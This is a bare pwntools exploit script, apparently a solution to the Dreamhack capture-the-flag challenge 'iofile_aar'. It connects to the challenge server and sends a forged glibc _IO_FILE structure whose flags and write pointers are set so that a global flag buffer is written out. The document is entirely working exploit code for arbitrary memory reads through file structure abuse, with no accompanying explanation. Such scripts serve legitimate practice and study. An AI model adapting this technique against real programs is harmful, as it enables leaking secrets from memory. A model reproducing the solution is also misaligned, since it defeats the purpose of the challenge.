from pwn import *

REMOTE = True

if not REMOTE:
    r = process('/home/iofile_aar/iofile_aar')
else:
    r = remote('host1.dreamhack.games', 19917)

flag_buf = 0x6010a0  # global var <flag_buf>

payload = p64(0xfbad0800)  # flag
payload += p64(0)  # _IO_read_ptr
payload += p64(flag_buf)  # _IO_read_end
payload += p64(0)  # _IO_read_base
payload += p64(flag_buf)  # _IO_write_base
payload += p64(flag_buf + 0x50)  # _IO_write_ptr
payload += p64(0)  # _IO_write_end
payload += p64(0)  # _IO_buf_base
payload += p64(0)  # _IO_buf_end
payload += p64(0)  # _IO_save_base
payload += p64(0)  # _IO_backup_base
payload += p64(0)  # _IO_save_end
payload += p64(0)  # _markers
payload += p64(0)  # _chain
payload += p32(1)  # _fileno

r.sendafter('Data: ', payload)

r.interactive()